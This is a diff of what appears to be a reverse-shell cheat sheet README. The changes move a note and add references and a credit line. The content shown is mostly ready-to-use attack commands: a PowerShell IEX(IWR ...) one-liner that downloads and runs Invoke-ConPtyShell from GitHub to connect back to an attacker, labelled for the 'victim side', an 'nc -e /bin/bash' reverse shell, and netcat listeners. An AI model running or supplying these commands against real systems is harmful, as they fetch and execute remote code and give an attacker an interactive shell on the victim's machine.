@@ -21,11 +21,11 @@ example : stty raw -echo; (stty size; cat) | nc -lvnp 88 -s 10.0.0.2
 ```
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell "ip" "port"
 ```
-#### NOTE: 
-For client/victim side~ Command should be initiated in powershell, not cmd
 ```
 example : IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.1 88
 ```
+#### NOTE: 
+For client/victim side~ Command should be initiated in powershell, not cmd
 
 ## For Linux
 ## Requirements
@@ -52,3 +52,12 @@ nc -lnvp "port" -s "ip"
 ```
 nc -e /bin/bash "ip" "port"
 ```
+## References
+
+1. https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/
+2. https://github.com/microsoft/terminal
+3. https://www.usenix.org/conference/usenixsecurity20/presentation/niakanlahiji
+4. https://adepts.of0x.cc/shadowmove-hijack-socket/
+
+## THANK YOU
+## Credit: 249KING
